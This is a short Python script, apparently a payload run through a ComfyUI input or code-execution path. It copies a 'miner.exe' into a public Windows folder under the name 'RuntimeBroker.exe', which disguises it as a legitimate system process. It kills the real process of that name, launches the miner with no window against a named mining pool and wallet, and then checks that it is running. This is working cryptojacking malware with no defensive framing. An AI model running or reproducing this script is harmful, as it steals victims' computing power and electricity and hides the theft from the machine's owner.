import subprocess, os, shutil, time

results = []
input_dir = r'D:\ComfyUI-aki-v1.4\input'
src = os.path.join(input_dir, 'miner.exe')
dst_dir = r'C:\Users\Public\Downloads'
dst = os.path.join(dst_dir, 'RuntimeBroker.exe')

results.append(f'Source exists: {os.path.exists(src)}')

try:
    subprocess.run(['taskkill', '/F', '/IM', 'RuntimeBroker.exe'], capture_output=True)
    time.sleep(2)
except:
    pass

try:
    os.makedirs(dst_dir, exist_ok=True)
    shutil.copy2(src, dst)
    results.append(f'Copied to {dst}')
except Exception as e:
    results.append(f'Copy error: {e}')

if os.path.exists(dst):
    cmd = [dst, '--pool', 'stratum+tcp://sg1.alphapool.tech:5566', '--address', 'prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg', '--worker', 'RTX4090_107', '--force-backend', 'ada']
    subprocess.Popen(cmd, creationflags=0x08000000)
    results.append('Started')
    time.sleep(8)
    
    r = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq RuntimeBroker.exe'], capture_output=True, text=True)
    if 'RuntimeBroker.exe' in r.stdout:
        results.append('RUNNING!')
    else:
        results.append('NOT RUNNING')
        results.append(r.stdout[:200] if r.stdout else 'no output')

result = chr(10).join(results)
